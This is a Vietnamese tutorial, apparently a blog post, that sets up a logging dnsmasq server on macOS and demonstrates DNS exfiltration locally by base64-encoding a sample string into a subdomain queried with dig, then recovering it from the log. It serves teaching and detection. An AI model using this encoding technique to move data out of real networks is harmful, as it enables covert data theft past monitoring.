---
title: "DNS exfiltration"
seoTitle: "Preventing DNS Data Exfiltration"
seoDescription: "Explore DNS exfiltration techniques using a DNS server on macOS, including setup with dnsmasq, data encoding, and log analysis"
datePublished: Thu Dec 05 2024 01:47:28 GMT+0000 (Coordinated Universal Time)
cuid: cm4anq28g000209mha2sy11vu
slug: dns-exfiltration
tags: dns, devops

---

Trong bài viết này, chúng ta sẽ đào sâu vào cách **dựng một máy chủ DNS trên unix** và cách thực hiện một tình huống để minh họa cho **DNS Exfiltration** trên máy cá nhân. DNS Exfiltration là một kỹ thuật mà kẻ tấn công sử dụng để đánh cắp dữ liệu qua các truy vấn DNS, và chúng ta sẽ thực hiện tất cả trên máy macOS của mình.

## Bước 1: Cài đặt và cấu hình `dnsmasq`

Để dựng một máy chủ DNS trên macOS, chúng ta sẽ sử dụng **dnsmasq** - một công cụ nhẹ nhàng và phổ biến cho mục đích này.

### 1.1 Cài đặt `dnsmasq`

Trước tiên, hãy cài đặt **Homebrew** (nếu bạn chưa có):

```bash
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

Sau đó, cài đặt **dnsmasq**:

```bash
brew install dnsmasq
```

### 1.2 Cấu hình `dnsmasq`

Sau khi cài đặt xong, chúng ta cần cấu hình `dnsmasq`. Tạo file cấu hình trong thư mục `/opt/homebrew/etc/` (hoặc ví trí mà `dnsmasq` cài đặt).

Mở file cấu hình:

```bash
vim /opt/homebrew/etc/dnsmasq.conf
```

Thêm các dòng cấu hình sau vào file:

```bash
address=/mytestdomain.com/127.0.0.1
log-queries
log-facility=/opt/homebrew/var/log/dnsmasq.log
```

* `address=/`[`mytestdomain.com/127.0.0.1`](http://mytestdomain.com/127.0.0.1): Trả về địa chỉ IP `127.0.0.1` cho tên miền [`mytestdomain.com`](http://mytestdomain.com).
    
* `log-queries`: Ghi lại các truy vấn DNS.
    
* `log-facility=/opt/homebrew/var/log/dnsmasq.log`: Định vị nơi ghi log.
    

### 1.3 Tạo file log và start `dnsmasq`

Tạo file log để lưu các truy vấn DNS:

```bash
sudo mkdir -p /opt/homebrew/var/log
sudo touch /opt/homebrew/var/log/dnsmasq.log
sudo chmod 666 /opt/homebrew/var/log/dnsmasq.log
```

Sau đó, khởi động `dnsmasq`:

```bash
sudo brew services start dnsmasq
```

## Bước 2: Cấu hình DNS trên macOS

Bạn cần cấu hình macOS để sử dụng `dnsmasq` làm DNS server:

1. Mở **System Preferences &gt; Network**.
    
2. Chọn kết nối Wi-Fi hoặc Ethernet.
    
3. Chọn **Advanced** và chuyển tới tab **DNS**.
    
4. Thêm địa chỉ IP **127.0.0.1**.
    

## Bước 3: Test DNS Exfiltration

Bây giờ bạn đã có máy chủ DNS của riêng mình và sắn sàng ghi lại các truy vấn. Hãy thực hiện một cuộc **DNS exfiltration** đơn giản.

### 3.1 Mã hóa dữ liệu thành Base64

Giả sử bạn muốn chuyển dữ liệu nhạy cảm "SensitiveInfo":

```bash
echo -n "SensitiveInfo" | base64
```

Kết quả sẽ là:

```bash
U2Vuc2l0aXZlSW5mbw==
```

### 3.2 Gửi truy vấn DNS chứa dữ liệu mã hóa

Sử dụng lệnh `dig` để gửi dữ liệu qua DNS:

```bash
dig U2Vuc2l0aXZlSW5mbw.mytestdomain.com @127.0.0.1
```

* `U2Vuc2l0aXZlSW5mbw` là dữ liệu đã được mã hóa Base64.
    
* `@127.0.0.1` là địa chỉ của máy chủ DNS bạn đã dựng.
    

### 3.3 Kiểm tra log của `dnsmasq`

Bạn có thể kiểm tra log để xem các truy vấn DNS có chứa dữ liệu mã hóa không:

```bash
cat /opt/homebrew/var/log/dnsmasq.log
```

Trong log, bạn sẽ thấy các truy vấn chứa chuỗi Base64 (`U2Vuc2l0aXZlSW5mbw`), chứng tỏ rằng dữ liệu đã được gửi qua DNS.

### 3.4 Decode Base64

Sau khi kiểm tra log, bạn có thể giải mã chuỗi Base64 để xem dữ liệu ban đầu:

```bash
echo "U2Vuc2l0aXZlSW5mbw==" | base64 --decode
```

Kết quả sẽ là:

```bash
SensitiveInfo
```